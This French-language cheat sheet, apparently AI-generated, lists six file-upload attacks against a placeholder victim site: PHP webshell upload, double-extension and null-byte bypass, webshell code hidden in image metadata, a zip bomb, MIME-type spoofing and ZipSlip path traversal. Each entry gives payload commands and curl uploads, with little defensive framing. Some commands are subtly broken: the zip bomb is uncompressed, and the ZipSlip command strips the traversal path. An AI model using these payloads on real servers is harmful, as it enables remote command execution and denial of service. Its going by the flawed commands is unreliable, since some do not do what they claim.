1. Téléversement de fichier exécutable (webshell)  
   - Payload d’attaque neutre (exemple brut) : Générer un fichier shell.php contenant le code `<?php system($_GET['cmd']); ?>` avec la commande echo "<?php system(\$_GET['cmd']); ?>" > shell.php  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@shell.php" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Accéder à https://site-victime.net/uploads/shell.php?cmd=id ou utiliser curl https://site-victime.net/uploads/shell.php?cmd=id pour vérifier si la commande est exécutée côté serveur  
   - Élément d’analyse détaillé : Vérifier si le serveur exécute le fichier téléchargé, permettant l’exécution de commandes arbitraires ou la prise de contrôle du serveur  
   - Méthodologie détaillée de découverte : Générer un webshell, le téléverser, puis accéder à son URL pour observer s’il est interprété ou simplement stocké[4][5][8]  
   - Source : https://portswigger.net/web-security/file-upload

2. Téléversement de fichier avec double extension ou null byte  
   - Payload d’attaque neutre (exemple brut) : Générer un fichier shell.php.jpg contenant le code `<?php system($_GET['cmd']); ?>` avec la commande echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@shell.php.jpg" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Tester https://site-victime.net/uploads/shell.php.jpg?cmd=id ou https://site-victime.net/uploads/shell.php%00.jpg?cmd=id pour voir si le serveur interprète le fichier comme script  
   - Élément d’analyse détaillé : Vérifier si le serveur ne contrôle que l’extension ou le type MIME côté client, permettant le contournement avec des extensions doubles ou des caractères spéciaux  
   - Méthodologie détaillée de découverte : Générer un fichier avec double extension ou null byte, l’uploader, puis tester si le serveur l’interprète comme script ou fichier statique[4][5][6]  
   - Source : https://portswigger.net/web-security/file-upload

3. Téléversement de fichier contenant du code malicieux dans les métadonnées  
   - Payload d’attaque neutre (exemple brut) : Générer une image test.jpg puis injecter `<?php system($_GET['cmd']); ?>` dans les métadonnées avec exiftool -Comment='<?php system($_GET["cmd"]); ?>' test.jpg  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@test.jpg" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Accéder à https://site-victime.net/uploads/test.jpg ou utiliser exiftool test.jpg pour vérifier si le code malicieux est stocké ou exploité  
   - Élément d’analyse détaillé : Vérifier si le serveur ou une fonctionnalité ultérieure traite ou exécute les métadonnées du fichier, permettant une attaque indirecte  
   - Méthodologie détaillée de découverte : Générer une image avec code malicieux dans les métadonnées, l’uploader, puis observer si ces métadonnées sont exploitées ou exécutées par l’application ou un utilisateur[4][5]  
   - Source : https://portswigger.net/web-security/file-upload

4. Téléversement de fichier volumineux ou zip bomb  
   - Payload d’attaque neutre (exemple brut) : Générer une zip bomb avec la commande python -c "f=open('bomb.txt','w');f.write('0'*100000000);f.close(); import zipfile; z=zipfile.ZipFile('bomb.zip','w'); z.write('bomb.txt')"  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@bomb.zip" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Surveiller le comportement du serveur après l’upload (ralentissement, crash, erreur 500) ou consulter les logs système  
   - Élément d’analyse détaillé : Vérifier si le serveur traite ou extrait les fichiers sans limite de taille, pouvant entraîner un déni de service ou une saturation disque  
   - Méthodologie détaillée de découverte : Générer une zip bomb, l’uploader, puis observer la stabilité de l’application, la consommation de ressources et les logs après l’upload[4]  
   - Source : https://portswigger.net/web-security/file-upload

5. Téléversement de fichier avec contournement du contrôle MIME  
   - Payload d’attaque neutre (exemple brut) : Générer un fichier shell.php contenant du code PHP puis forcer le type MIME à image/jpeg lors de l’upload  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@shell.php;type=image/jpeg" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Accéder à https://site-victime.net/uploads/shell.php?cmd=id ou vérifier si le fichier est listé comme image mais exécuté comme script  
   - Élément d’analyse détaillé : Vérifier si le serveur se fie uniquement au type MIME déclaré par le client, permettant l’upload de fichiers dangereux déguisés  
   - Méthodologie détaillée de découverte : Générer un fichier exécutable, modifier le type MIME lors de l’upload, puis tester son exécution ou son affichage dans l’application[4][5]  
   - Source : https://portswigger.net/web-security/file-upload

6. Téléversement avec path traversal ou ZipSlip  
   - Payload d’attaque neutre (exemple brut) : Générer une archive ZIP contenant un fichier ../shell.php avec zip --junk-paths evil.zip ../shell.php  
   - Commande d’attaque (exemple complet) : curl -X POST -F "file=@evil.zip" https://site-victime.net/upload  
   - Commande d’analyse (exemple complet) : Tenter d’accéder à https://site-victime.net/shell.php ou https://site-victime.net/config.php pour vérifier si le fichier a été extrait hors du dossier prévu  
   - Élément d’analyse détaillé : Vérifier si le serveur est vulnérable à la traversée de répertoires lors de la décompression d’archives, permettant d’écraser ou créer des fichiers à des emplacements arbitraires  
   - Méthodologie détaillée de découverte : Générer une archive ZIP avec des chemins relatifs, l’uploader, puis tenter d’accéder aux fichiers hors du répertoire d’upload ou vérifier si des fichiers critiques ont été écrasés[3][4]  
   - Source : https://portswigger.net/web-security/file-upload

---
